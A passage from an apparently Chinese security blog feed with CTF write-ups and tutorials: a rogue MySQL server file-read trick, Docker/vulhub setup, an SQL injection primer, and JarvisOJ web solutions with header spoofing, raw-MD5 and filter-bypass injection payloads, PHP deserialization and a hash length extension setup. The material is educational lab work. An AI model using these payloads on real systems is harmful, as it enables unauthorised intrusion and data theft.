文件并发给我！客户端：这是文件内容：balabal！</code></pre><p>正常情况下，这个流程不会有什么问题，但是如果我们制作了恶意的客户端，并且回复服务端任意一个我们想要获取的文件，那么情况就不一样了。</p><pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！服务端：OK，读取你本地的 / etc/passwd 文件并发给我！客户端：这是文件内容：balabal（/etc/passwd 文件的内容）！</code></pre></blockquote><p>伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在LOAD DATA LOCAL的时候。</p><h1 id="伪造服务端"><a href="#伪造服务端" class="headerlink" title="伪造服务端"></a>伪造服务端</h1><p>利用github上项目： <a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a><br><a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a><br><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</a><br><a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql load data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 16.04 配置docker</title>
      <link href="/2019/08/02/ubuntu%E9%85%8D%E7%BD%AEdocker/"/>
      <url>/2019/08/02/ubuntu%E9%85%8D%E7%BD%AEdocker/</url>
      
        <content type="html"><![CDATA[<p>学会装docker，走遍天下都不怕!<br>😊 🆒</p><a id="more"></a><h1 id="Ubuntu-16-04-配置docker"><a href="#Ubuntu-16-04-配置docker" class="headerlink" title="Ubuntu 16.04 配置docker"></a>Ubuntu 16.04 配置docker</h1><p>想装个docker好好学学p神的vulhub:<a href="https://github.com/vulhub/vulhub" title="p神-vulhub">https://github.com/vulhub/vulhub</a></p><h2 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h2><p>先备份</p><pre><code>sudo cp /etc/apt/sources.list /etc/apt/sources_init.list</code></pre><p>更换</p><pre><code>sudo gedit /etc/apt/sources.list</code></pre><p>阿里</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</code></pre><p>清华</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</code></pre><p>网易</p><pre><code>deb http://mirrors.163.com/ubuntu/ wily main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-backports main restricted universe multiverse</code></pre><p>执行更新</p><pre><code>sudo apt-get update</code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>查看内核版本</p><pre><code>uname -r</code></pre><p>启动服务</p><pre><code>sudo service docker start</code></pre><p>测试</p><pre><code>docker run hello-world</code></pre><h2 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h2><p>新建<code>/etc/docker/daemon.json</code>文件来配置daemon，在该文件中加入</p><pre><code>{  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]}</code></pre><h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><p>我们通过使用<code>-t -i</code>参数来进入交互式终端</p><pre><code>docker run -i -t ubuntu:15.10 /bin/bash</code></pre><p>我们已进入终端，可以使用<code>ls</code>，<code>cat /proc/version</code>查看信息.</p><p>我们使用 -d 参数创建一个以进程方式运行的容器</p><p>docker -d </p><p>我们使用 ps 来查看容器信息</p><pre><code>docker ps</code></pre><p>我们使用 stop 来停止容器</p><pre><code>docker stop name</code></pre><p>我们使用<code>docker images</code> 来列出本地镜像列表</p><p>使用 <code>docker pull</code> 来获得一个镜像</p><p>使用 <code>docker search name</code> 来查找一个镜像</p><h3 id="运行一个web应用"><a href="#运行一个web应用" class="headerlink" title="运行一个web应用"></a>运行一个web应用</h3><p>在docker中运行一个Python flask 应用来运行一个web应用。</p><pre><code>docker pull training/webapp #载入镜像docker run -d -P training/webapp python app.py</code></pre><p>-P将容器内部使用的网络端口随机映射到我们使用的主机高端口上<br>-p容器内部端口绑定到指定主机端口</p><p>另外 我们也可以指定IP地址。</p><h2 id="下载vulhub"><a href="#下载vulhub" class="headerlink" title="下载vulhub"></a>下载vulhub</h2><pre><code>wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zip</code></pre><p>解压时候可能会报错</p><pre><code>unzip:  cannot find zipfile directory in one of vulhub-master.zip orvulhub-master.zip.zip, and cannot find vulhub-master.zip.ZIP, period.</code></pre><p>我们换个压缩方式就成</p><pre><code>sudo apt-get install fastjarjar xvf vulhub-master.zip</code></pre><p>然后</p><pre><code>cd vulhub-master# Enter the directory of vulnerability/environmentcd flask/ssti# Compile environmentdocker-compose build# Run environmentdocker-compose up -d</code></pre><p>愉快的学习吧！</p><h2 id="复现ctf环境"><a href="#复现ctf环境" class="headerlink" title="复现ctf环境"></a>复现ctf环境</h2><h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><p>先进入dockerfile目录，建立一个images</p><pre><code>docker build -t name . docker run -i -d -p 20000:80 name</code></pre><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><pre><code>docker-compose builddocker-compose up -d</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a><br><a href="https://www.runoob.com/docker/docker-container-connection.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-container-connection.html</a><br><a href="https://askubuntu.com/questions/54904/unzip-error-end-of-central-directory-signature-not-found" target="_blank" rel="noopener">https://askubuntu.com/questions/54904/unzip-error-end-of-central-directory-signature-not-found</a><br><a href="https://blog.csdn.net/qq_35451572/article/details/79516563" target="_blank" rel="noopener">https://blog.csdn.net/qq_35451572/article/details/79516563</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL入门</title>
      <link href="/2019/08/02/SQL%E5%85%A5%E9%97%A8/"/>
      <url>/2019/08/02/SQL%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>Sql注入真的超神奇的，我怎么都学不会呢！<br>😀</p><a id="more"></a><h1 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h1><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><ul><li>version() mysql版本</li><li>user() 数据库用户名</li><li>database() 数据库名</li><li>@@datadir 数据库路径</li><li>@@version_compile_os 操作系统版本</li></ul><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><ul><li>concat(str1,str2, …) 没有分隔符的连接字符串</li><li>concat_ws(separator,str1,str2,…) 有分隔符的连接字符串</li><li>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</li></ul><h3 id="常用尝试语句"><a href="#常用尝试语句" class="headerlink" title="常用尝试语句"></a>常用尝试语句</h3><ul><li>or 1=1 –+(注释符)</li><li>‘ or 1=1 –+</li><li>“ or 1=1 –+</li><li>) or 1=1 –+</li><li>‘) or 1=1 –+</li><li>“) or 1=1 –+</li><li>“)) or 1=1 –+</li><li>–+可以用#替换</li></ul><p>查询语句一般为</p><pre><code>$sql=&quot;SELECT * from users where id = &apos;$id&apos; limit 0,1&quot;</code></pre><p>从上面的尝试语句我们可以看出来语句的作用有两个，一个是人为闭合 <code>$id</code> 后面的半个单引号，一个是注释整个语句后的引号。</p><h3 id="union-操作符"><a href="#union-操作符" class="headerlink" title="union 操作符"></a>union 操作符</h3><p>union操作符用来合并两个或多个SELECT语句的结果集。使用union时的select语句必须拥有相同数量的列，同时列也必须有相似的数据类型，且每条select语句中列的顺序必须相同。</p><p>例如这两有三个数据表</p><pre><code>+-----------------+| Tables_in_test1 |+-----------------+| emails          || user            || users           |+-----------------+select * from emails;+--------+-------------+| number | addr        |+--------+-------------+|  1     | 123@126.com |+--------+-------------+1 row in set (0.00 sec)+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  |</code></pre><p>两个表的列数量不同则我们就无法使用UNION</p><pre><code>mysql&gt; select * from emails UNION select * from user;ERROR 1222 (21000): The used SELECT statements have a different number of columns</code></pre><p>默认的，UNION操作符选取不同的值，如果允许重复的话请使用UNION ALL。另外，UNION结果集中的列名总是等于UNION中第一个SELECT结果的列名。</p><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><p>为什么我们称 <code>&#39; or 1=1#</code> 为万能密码？</p><p>查询语句是<code>select * from admin where username = &#39;admin&#39; and passwd = &#39;&#39; or 1=1#&#39;</code> 时我们可以不输入密码进行登陆账户，原因在于where 后面的三个条件语句<code>username = &#39;admin&#39;</code>  <code>and passwd=&#39;&#39;</code>  <code>or 1=1</code>。三个子句用 and 、 or 连接，在sql语句中 and 运算符的优先级高于 or 运算符。在计算时第一个子句为真，第二个为假，二者and以后为假，这个假的结果再与第三个or ，结果为真，所以这整句的结果就恒真了。</p><h2 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h2><p>关于UNION 的用法请参考第一节。</p><p>使用联合查询注入利用的前提是页面有回显位。</p><p>所谓回显位是指在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展现在页面中，这个展示数据的位置就叫回显位。</p><p>联合查询的基本步骤</p><ol><li>找到注入点判断闭合方式</li><li>判断数据库类型</li><li>判断查询列数</li><li>判断回显位</li><li>获取数据库名</li><li>获取表名</li><li>获取字段名</li><li>获取字段中的数据</li></ol><p>ORDER BY子句是基于一个或多个字段按照升序或降序对其中的数据进行排序。一些数据库默认的对查询结果进行升序排序，例如mysql。</p><p>我们可以指定字段名进行排序。这里我们有一张表</p><pre><code>+----+----------+-----+-----------+----------+| ID | NAME     | AGE | ADDRESS   | SALARY   |+----+----------+-----+-----------+----------+|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 ||  2 | Khilan   |  25 | Delhi     |  1500.00 ||  3 | kaushik  |  23 | Kota      |  2000.00 ||  4 | Chaitali |  25 | Mumbai    |  6500.00 ||  5 | Hardik   |  27 | Bhopal    |  8500.00 ||  6 | Komal    |  22 | MP        |  4500.00 ||  7 | Muffy    |  24 | Indore    | 10000.00 |+----+----------+-----+-----------+----------+</code></pre><p>查询语句例如 </p><pre><code>SELECT * FROM CUSTOMERS   ORDER BY NAME, SALARY;</code></pre><p>查询结果如下</p><pre><code>+----+----------+-----+-----------+----------+| ID | NAME     | AGE | ADDRESS   | SALARY   |+----+----------+-----+-----------+----------+|  4 | Chaitali |  25 | Mumbai    |  6500.00 ||  5 | Hardik   |  27 | Bhopal    |  8500.00 ||  3 | kaushik  |  23 | Kota      |  2000.00 ||  2 | Khilan   |  25 | Delhi     |  1500.00 ||  6 | Komal    |  22 | MP        |  4500.00 ||  7 | Muffy    |  24 | Indore    | 10000.00 ||  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |+----+----------+-----+-----------+----------+</code></pre><p>同时，我们也可以指定字段的栏位进行排序，第一个字段为1，第二个为2，以此类推。</p><p>这里我们有一张表</p><pre><code>+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb        ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy      ||  5 | stupid   | stupidity  ||  6 | superman | genious     ||  7 | batman   | mob!le      ||  8 | admin    | admin       ||  9 | admin1   | admin1      || 10 | admin2   | admin2      || 11 | admin3   | admin3      || 12 | dhakkan  | dumbo       || 14 | admin4   | admin4      || 15 | admin#   | 789          |+----+----------+------------+</code></pre><p>我们使用栏位进行查询</p><pre><code>select * from users order by 3;</code></pre><p>查询结果按照第三栏进行排序</p><pre><code>+----+----------+------------+| id | username | password   |+----+----------+------------+| 15 | admin#   | 789         ||  8 | admin    | admin       ||  9 | admin1   | admin1      || 10 | admin2   | admin2      || 11 | admin3   | admin3      || 14 | admin4   | admin4      ||  4 | secure   | crappy      ||  1 | Dumb     | Dumb        || 12 | dhakkan  | dumbo       ||  6 | superman | genious     ||  2 | Angelina | I-kill-you ||  7 | batman   | mob!le      ||  3 | Dummy    | p@ssword   ||  5 | stupid   | stupidity  |+----+----------+------------+</code></pre><p>如果我们查询一个不存在的栏位呢？</p><pre><code>select * from users order by 4;</code></pre><p>数据库将会报错</p><pre><code>ERROR 1054 (42S22): Unknown column &apos;4&apos; in &apos;order clause&apos;</code></pre><p>基于此，我们可以利用二分法来对列数进行猜解。</p><p>我们使用UNION来判断回显位，UNION的作用是将两个select查询结果合并</p><pre><code>select id,username from users where id=4 union select 1,2;</code></pre><p>查询结果如下</p><pre><code>+----+----------+| id | username |+----+----------+|  4 | secure   ||  1 | 2          |+----+----------+</code></pre><p>在展示数据的时候通常指取结果集的第一行数据，如果我们想取出后半部分的结果，就要使原来的查询查不出结果</p><pre><code>select id,username from users where id=-4 union select 1,2;</code></pre><p>通过查询负数，这样就可以得到我们先要的数据了</p><pre><code>+----+----------+| id | username |+----+----------+|  1 | 2        |+----+----------+</code></pre><p>得到回显位之后，获取数据库名就在回显位使用database()函数</p><pre><code>select id,username from users where id=-4 union select 1,database();</code></pre><p>接下来查询库中所有表名，仍然是在回显位进行查询</p><pre><code>select id,username from users where id=-4 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();</code></pre><p>然后是表中的列名</p><pre><code>select id,username from users where id=-4 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;;</code></pre><p>最后是数据</p><pre><code>select id,username from users where id=-4 union select 1,username from users;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ WP</title>
      <link href="/2019/08/01/JarvisOJ/"/>
      <url>/2019/08/01/JarvisOJ/</url>
      
        <content type="html"><![CDATA[<p>真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>有时间也做做别的</p><h3 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h3><p>题目链接：<a href="http://web.jarvisoj.com:32770/" title="题目链接" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p><p>要用本地51端口去访问</p><pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><p>但是应该是题目问题，没显示出来flag。</p><h3 id="Localhost"><a href="#Localhost" class="headerlink" title="Localhost"></a>Localhost</h3><p>题目链接 <a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p><p>题目要求localhost only,我们可以通过伪造X-FORWARDED-FOR来达到目的</p><pre><code>import requestsurl=&apos;http://web.jarvisoj.com:32774/&apos;s=requests.session()data={&apos;X-FORWARDED-FOR&apos;:&apos;127.0.0.1&apos;}r=s.get(url,headers=data)print(r.text)</code></pre><p>返回信息包含flag</p><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>这里再稍稍补充一下HTTP协议请求头的知识</p><ol><li>每个HTTP请求的第一行都由3个以空格间隔的项目组成</li><li>一个说明HTTP方法的动词，主要作用是从Web服务器获取一个资源，GET请求并没有消息主题，因此消息头后的空白行中没有其他数据。</li><li>第二个是请求的URL，通常由一个所请求的资源名称以及客户端向该资源提交的参数的可选查询字符串组成</li><li>第三个是使用的HTTP版本，常用HTTP版本为1.1和1.0，我们遇到的唯一差异可能就是1.1版本必须使用Host请求</li><li>Referer消息头表示用于发出请求的原始URL</li><li>User-Agent消息头提供与浏览器或其他生成请求的客户端软件有关的信息</li><li>Host消息头用于指定出现在被访问的完整URL中的主机名称，如果几个WEB站点以相同的一台服务器为主机就需要指定HOST，因为第一行中的URL通常不包含主机名称。服务器可以通过该字段进行IP过滤操作。</li><li>X-FORWARDED-FOR当你使用了代理时web服务器就不知道你的真实IP了，为了避免这种情况代理服务器会增加一个该字段信息，把链接他的客户端IP加到这个消息头里，保证服务器能获取到真实IP。这是一个扩展头。</li><li>cookie为服务器端生成的存于客户端的身份标识</li></ol><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>题目链接：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p><p>打开题目是一个密码的提交框，随便测一下没什么收获，查看请求信息发现HINT在响应头里</p><pre><code>&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><p>这里将md5后的密码提交查询，注意到md5的第二个参数为true</p><pre><code>string md5( string $str[, bool $raw_output = false] )</code></pre><p><strong>raw_output<br>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</strong></p><p>我们需要寻找一个字符串在md5之后含有 <code>&#39; or &#39;</code> 之类的可以产生闭合的。</p><p>国外的大佬在2010年跑出来了几个符合条件的<a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" title="这是那篇博客" target="_blank" rel="noopener">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p><p>我们可以用两个 </p><pre><code>129581926211651571912466741651878684928ffifdyop</code></pre><h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p><p>进入题目后查看源码发现ba64加密的字符串，</p><p><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p><p>尝试编码index.php读源码</p><pre><code>&lt;?php     require_once(&apos;shield.php&apos;);    $x = new Shield();    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];    if (!empty($g)) {        $x = unserialize($g);    }    echo $x-&gt;readfile();?&gt;</code></pre><p>可以看到包含了shield.php，再读shield.php</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = &apos;&apos;) {            $this -&gt; file = $filename;        }        function readfile() {            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE              &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {                return @file_get_contents($this-&gt;file);            }        }    }?&gt;</code></pre><p>简单的序列化，控制file变量</p><pre><code>&lt;?php    //flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$example = new Shield();$example-&gt;file = &quot;pctf.php&quot;;echo serialize($example);?&gt;</code></pre><h3 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h3><p>题目链接：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p><p>查看源码发现hint，进而读取源码</p><pre><code>&lt;?phperror_reporting(0);echo &quot;&lt;!--index.phps--&gt;&quot;;if(!$_GET[&apos;id&apos;]){    header(&apos;Location: index.php?id=1&apos;);    exit();}$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;)){    echo &apos;Hahahahahaha&apos;;    return ;}$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4){    require(&quot;flag.txt&quot;);}else{    print &quot;work harder!harder!harder!&quot;;}?&gt;</code></pre><p>简单分析之后我们需要注意几个点</p><ol><li>stripos()字符串截取函数，与strpos不同前者不区分大小写。</li><li>php中 <code>0admin == 0</code> ,在比较时会将字符串转换成整型再比较。</li><li>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法，Note: 如果要打开有特殊字符的 URL （比如说有空格），就需要使用 urlencode() 进行 URL 编码。也就是说我们可以在服务器上放一个文件然后传ip地址，如果这样做的话我们还要避免 <code>.</code>,我们可以通过将点分十进制转换为十进制。转换器：<a href="https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef" title="地址转换" target="_blank" rel="noopener">https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef</a>。同时我们也可以使用伪协议：<code>php://input</code> 来Post一个字符串。</li><li>eregi()不区分大小写的正则表达式匹配.这里我们通过%00截断来绕过eregi的检测。</li><li>%00在strlen的判断中仍占3个字符。</li></ol><p>我们进行构造</p><pre><code>http://web.jarvisoj.com:32780/index.php?id=0admin&amp;a=php://input&amp;b=%00admin</code></pre><p>得到</p><p>﻿<code>Come ON!!! {/^HT2mCpcvOLf}</code></p><p>进行访问得到</p><pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</code></pre><p>现在开始这是一道注入题了</p><p>测试id=2,返回</p><pre><code>SELECT * FROM content WHERE id=2</code></pre><p>id=1’</p><pre><code>SELECT * FROM content WHERE id=1&apos;</code></pre><p>id=1 and 1=1 #</p><pre><code>you bad boy/girl!</code></pre><p>测试发现我们不需要闭合单引号与注释，同时过滤了空格。对于空格首先尝试/**/，发现不行，那么/*a*/呢？</p><pre><code>?id=1/*a*/and/*a*/1=1 hi666</code></pre><p>这样可以。然后猜测字段个数</p><pre><code>?id=1/*a*/order/*a*/by/*a*/3</code></pre><p>看回显位，这里union,select 都被过滤，双写绕过</p><pre><code>?id=-1/*a*/ununionion/*a*/selselectect/*a*/1,2,3</code></pre><p>看数据库</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),database()</code></pre><p>看表，这里from同样双写</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(table_name)/*a*/frfromom/*a*/information_schema.tables/*a*/where/*a*/table_schema=database()</code></pre><p>看字段，不能直接传表名，需要16进制编码一下</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(column_name)/*a*/frfromom/*a*/information_schema.columns/*a*/where/*a*/table_name=0x636f6e74656e74</code></pre><p>看信息得到flag</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),context/*a*/frofromm/*a*/content    </code></pre><h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><p>拿到题目看到 <strong>Only Admin can see the flag!!</strong></p><p>先看看响应头信息，尝试改一下cookie为admin，果然没这么简单。</p><p>拿扫描器扫一下扫到了<code>index.php~</code>,看一下16进制数据发现是vim产生的文件，先改一下后缀为<code>index.php.swp</code>用<code>vim -r index.php</code> 恢复一下得到源码.</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;    body {        background:gray;        text-align:center;    }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php         $auth = false;        $role = &quot;guest&quot;;        $salt =         if (isset($_COOKIE[&quot;role&quot;])) {            $role = unserialize($_COOKIE[&quot;role&quot;]);            $hsh = $_COOKIE[&quot;hsh&quot;];            if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) {                $auth = true;            } else {                $auth = false;            }        } else {            $s = serialize($role);            setcookie(&apos;role&apos;,$s);            $hsh = md5($salt.strrev($s));            setcookie(&apos;hsh&apos;,$hsh);        }        if ($auth) {            echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;        } else {            echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;        }    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>重点是 <code>if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;])))</code></p><p>HASH长度扩展攻击没错了。</p><h4 id="Hash-Length-Extension-Attacks"><a href="#Hash-Length-Extension-Attacks" class="headerlink" title="Hash Length Extension Attacks"></a>Hash Length Extension Attacks</h4><p><strong>原理</strong></p><blockquote><p>服务器将sercet 和 message 连接在一起，然后用摘要算法取摘要，研究发现MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL等摘要算法受此攻击，但MD2、SHA-224和SHA-384不受此攻击。</p><p>哈希摘要算法，如MD5、SHA1、SHA2等，都是基于Merkle–Damgård结构。这类算法有一个很有意思的问题：当知道hash(secret + message)的值及secret长度的情况下，可以轻松推算出hash(secret + message||padding||m’)。在这里m’是任意数据，||是连接符，可以为空,padding是secret后的填充字节。hash的padding字节包含整个消息的长度，因此，为了能准确计算出padding的值，secret的长度我们也是需要知道的。</p><p>当我们填充后，服务器算出的原始hash值，正好与我们添加扩展字符串并覆盖初始链变量所计算出来的一样。这是因为攻击者的哈希计算过程，相当于从服务器计算过程的一半紧接着进行下去。提交此hash值便能通过验证了，这就是所谓的哈希长度拓展攻击(Hash Length Extension Attacks)。</p></blockquote><p>MD5会对消息进行分组，每组64Byte,也就是512bit,不足512bit的会补位，使长度补充到56Byte,补位的二进制表示是在消息后面加一个1，后面都是0，也就是说在16进制下我们需要在后面补80，其他都是0，直到补到56Byte。</p><p>剩下的8Byte表示补位前消息长度，该长度是小端存储，高字节放在高地址中。计算开始前有一组初始向量负责第一轮的加密，此后每一次加密的结果作为下一次加密的初始向量。</p><p>MD5的初始向量是</p><pre><code>A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476</code></pre><p>我们举个例子来说明一下补位</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5iufmppywj30kv03igm3.jpg" alt></p><p>再来看这道题</p><p>我们不知道salt的长度，而算法的核心就是要知道其长度，不过我们可以爆破猜出来。同时这里对role反序了。</p><p>我们利用hashpump跑一下</p><pre><code>hashpumpInput Signature: 3a4727d57463f122833d9e732f94e4e0 //上一轮的结果，我们已经抓包得到了 Input Data: ;&quot;tseug&quot;:5:s  //原来的数据Input Key Length: 12      //长度是试出来的Input Data to Add: ;&quot;nimda&quot;:5:s 